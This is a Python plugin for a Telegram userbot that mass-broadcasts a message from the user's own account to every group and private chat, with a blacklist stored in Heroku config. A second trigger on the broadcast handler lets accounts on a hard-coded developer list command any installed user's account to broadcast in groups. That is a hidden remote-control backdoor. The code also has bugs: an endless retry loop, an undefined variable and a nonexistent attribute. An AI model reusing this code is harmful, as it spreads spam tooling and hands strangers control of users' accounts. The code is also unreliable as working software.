# Dam-PyroBot

import asyncio
from os import getenv

import heroku3
from pyrogram import Client, enums, filters
from pyrogram.types import Message
from requests import get

from config import BLACKLIST_GCAST, HEROKU_API_KEY, HEROKU_APP_NAME
from Dam.helpers.adminHelpers import DEVS
from Dam.helpers.tools import get_arg
from Dam.modules.Ubot.help import add_command_help

while 0 < 6:
    _GCAST_BLACKLIST = get(
        "https://raw.githubusercontent.com/damsyx/Reforestation/master/blacklistgcast.json"
    )
    if _GCAST_BLACKLIST.status_code != 200:
        if 0 != 5:
            continue
        GCAST_BLACKLIST = [
            -1001748391597,
            -1001473548283,
            -1001390552926,
            -1001687155877,
            -1001795125065,
            -1001704645461,
            -1001578091827,
            -1001380293847,
        ]
        break
    GCAST_BLACKLIST = _GCAST_BLACKLIST.json()
    break

del _GCAST_BLACKLIST

Heroku = heroku3.from_key(HEROKU_API_KEY)
heroku_api = "https://api.heroku.com"
blchat = getenv("BLACKLIST_GCAST") or ""


@Client.on_message(
    filters.group & filters.command("cgcast", ["."]) & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.command("gcast", [".", "-", "^", "!"]) & filters.me)
async def gcast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        Dam = await message.reply("`Globally Broadcasting...`")
    else:
        return await message.edit_text("**Give a Text or Reply Message.**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in GCAST_BLACKLIST and chat not in BLACKLIST_GCAST:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await Dam.edit_text(
        f"☑️ Done in sent to `{done}` Groups, Error in `{error}` Groups"
    )


@Client.on_message(filters.command("gucast", [".", "-", "^", "!", "?"]) & filters.me)
async def gucast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        Dam = await message.reply("`Globally Broadcasting...`")
    else:
        return await message.edit_text("**Give a Text or Reply Message.**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in DEVS:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await Dam.edit_text(f"☑️ Done in sent to `{done}` Users, Error in `{error}` Users")


@Client.on_message(filters.command("blchat", [".", "-", "^", "!", "?"]) & filters.me)
async def gcast_bl(client: Client, message: Message):
    blacklistgc = "True" if BLACKLIST_GCAST else "False"
    blc = blchat
    list = blc.replace(" ", "\n» ")
    if blacklistgc == "True":
        await message.reply(
            f"💡 **Blacklist GCAST:** `Enabled`\n\n📝 **Blacklist Group:**\n» {list}\n\nUsage: `.addbl` in the group you want to add to the gcast blacklist.",
        )
    else:
        await message.reply("🌐 **Blacklist GCAST:** `Disabled`")


@Client.on_message(filters.command("addbl", [".", "-", "^", "!", "?"]) & filters.me)
async def add(client: Client, message: Message):
    xxnx = await message.reply("♻️ `Processing...`")
    var = "BLACKLIST_GCAST"
    gc = message.chat.id
    if HEROKU_APP_NAME is not None:
        app = Heroku.app(HEROKU_APP_NAME)
    else:
        await xnxx.edit(
            "**Please Add Var** `HEROKU_APP_NAME` **to add blacklist**",
        )
        return
    heroku_Config = app.config()
    if message is None:
        return
    blgc = f"{BLACKLIST_GCAST} {gc}"
    blacklistgrup = (
        blgc.replace("{", "")
        .replace("}", "")
        .replace(",", "")
        .replace("[", "")
        .replace("]", "")
        .replace("set() ", "")
    )
    await xxnx.edit(
        f"**Successfully Added** `{gc}` **to the gcast blacklist.**\n\nRestarting Heroku to Apply Changes."
    )
    heroku_Config[var] = blacklistgrup


@Client.on_message(filters.command("delbl", [".", "-", "^", "!", "?"]) & filters.me)
async def _(client: Client, message: Message):
    xxx = await message.reply("♻️ `Processing...`")
    gc = message.chat_id
    if HEROKU_APP_NAME is not None:
        app = Heroku.app(HEROKU_APP_NAME)
    else:
        await xxx.edit(
            "**Please Add Var** `HEROKU_APP_NAME` **to remove gcast blacklist.**",
        )
        return
    heroku_Config = app.config()
    if message is None:
        return
    gett = str(gc)
    if gett in blchat:
        blacklistgrup = blchat.replace(gett, "")
        await xxx.edit(
            f"**Successfully Delete** `{gc}` **from the gcast blacklist.**\n\nRestarting Heroku to Apply Changes."
        )
        var = "BLACKLIST_GCAST"
        heroku_Config[var] = blacklistgrup
    else:
        await xxx.edit("**This group is not on the gcast blacklist.**", 45)


add_command_help(
    "gcast",
    [
        [
            ".gcast <text/reply>",
            "Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk.",
        ],
        [
            ".gucast <text/reply>",
            "Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk.",
        ],
        [
            ".blchat",
            "Melihat Daftar gcast blacklist yang anda tambahkan",
        ],
        [
            ".addbl <id grup>",
            "Menambahkan gcast blacklist.",
        ],
        [
            ".delbl <id grup>",
            "Menghapus gcast blacklist.",
        ],
    ],
)
